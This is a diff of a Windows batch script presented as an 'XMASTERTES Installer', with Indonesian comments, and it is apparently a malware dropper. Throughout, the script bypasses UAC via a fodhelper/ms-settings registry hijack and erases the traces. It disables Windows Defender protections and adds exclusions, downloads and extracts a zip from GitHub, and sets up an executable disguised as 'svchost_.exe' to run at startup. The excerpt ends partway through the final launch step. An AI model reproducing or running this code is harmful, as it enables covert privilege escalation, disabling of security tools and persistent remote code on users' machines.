@@ -1,10 +1,12 @@
 @echo off
-:: =========================================
-:: XMASTERTES Installer (Bypass .pwn Method)
-:: =========================================
+:: ===============================
+:: XMASTERTES Installer Final FIX
+:: Bypass .pwn + Elevated Execution
+:: ===============================
 
-:: ============ VARIABEL ============
+setlocal enabledelayedexpansion
 
+:: === VARIABEL ===
 set "folderPath=C:\ProgramData\AppData"
 set "zipName=XMASTERTES.zip"
 set "extractFolder=XMASTERTES-main"
@@ -13,17 +15,18 @@ set "exePath=%fullPath%\svchost_.exe"
 set "currentDir=%~dp0"
 set "bypassFile=%temp%\UACbypass.ps1"
 
-:: ============ CEK ADMINISTRATOR ============
-
+:: === CEK ADMINISTRATOR ===
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    echo [!] Membutuhkan hak administrator - mencoba bypass via .pwn...
-
-    :: Buat file PowerShell sementara untuk bypass
+    echo [!] Membutuhkan hak Administrator - mencoba bypass UAC...
+    
+    :: Buat file PowerShell sementara
     > "%bypassFile%" (
-        echo $program = "powershell -windowstyle hidden ^"%~f0 elevated^""
+        echo $bat = '%~f0'
+        echo $arg = 'elevated'
+        echo $cmd = "powershell -WindowStyle Hidden -Command Start-Process `"$bat`" -ArgumentList `"$arg`""
         echo New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force ^| Out-Null
-        echo Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+        echo Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $cmd -Force
         echo New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force ^| Out-Null
         echo Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
         echo Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
@@ -34,18 +37,17 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 
-:: Jika parameter "elevated" dipanggil, lanjutkan proses
+:: === HAPUS JEJAK BYPASS ===
 if "%~1"=="elevated" (
-    echo [*] Berhasil dijalankan sebagai Administrator...
-
-    :: Hapus jejak bypass
+    echo [*] Berhasil elevated. Membersihkan jejak...
     reg delete "HKCU\Software\Classes\.pwn" /f >nul 2>&1
     reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
     del /f /q "%bypassFile%" >nul 2>&1
 )
 
-:: ============ DETEKSI WINDOWS ============
+echo [*] Script berjalan sebagai Administrator...
 
+:: === DETEKSI WINDOWS ===
 ver | findstr /i "10.0." >nul
 if %errorlevel%==0 (
     goto Windows10
@@ -56,7 +58,7 @@ if %errorlevel%==0 (
 :Windows10
 echo [*] Windows 10 terdeteksi
 
-:: ===== NONAKTIFKAN PROTEKSI DEFENDER (WIN10) =====
+:: Nonaktifkan Proteksi Defender (Win10)
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -Command "Set-MpPreference -MAPSReporting 0"
 powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
@@ -65,7 +67,7 @@ goto DefenderExclusion
 :Windows11
 echo [*] Windows 11 terdeteksi
 
-:: ===== NONAKTIFKAN PROTEKSI DEFENDER (WIN11) =====
+:: Nonaktifkan Proteksi Defender (Win11)
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
 powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
@@ -79,29 +81,24 @@ echo [*] Menambahkan folder ke pengecualian Defender...
 powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
 powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"
 
-:: ============ BUAT FOLDER ============
-
+:: === BUAT FOLDER ===
 mkdir "%folderPath%" 2>nul
 
-:: ============ DOWNLOAD ZIP ============
-
+:: === DOWNLOAD ZIP ===
 echo [*] Mengunduh file dari GitHub...
 powershell -nologo -noprofile -executionpolicy bypass -command ^
 "Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"
 
-:: ============ EKSTRAK ZIP ============
-
+:: === EKSTRAK ZIP ===
 echo [*] Mengekstrak file ZIP...
 powershell -nologo -noprofile -executionpolicy bypass -command ^
 "Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"
 
-:: ============ TAMBAH KE STARTUP ============
-
+:: === TAMBAHKAN KE STARTUP ===
 echo [*] Menambahkan ke startup...
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d "%exePath%" /f
 
-:: ============ JALANKAN DAN BUKA FOLDER ============
-
+:: === JALANKAN APLIKASI ===
 echo [*] Menjalankan aplikasi...
 start "" explorer "%fullPath%"
 if exist "%fullPath%\RunScript.bat" (
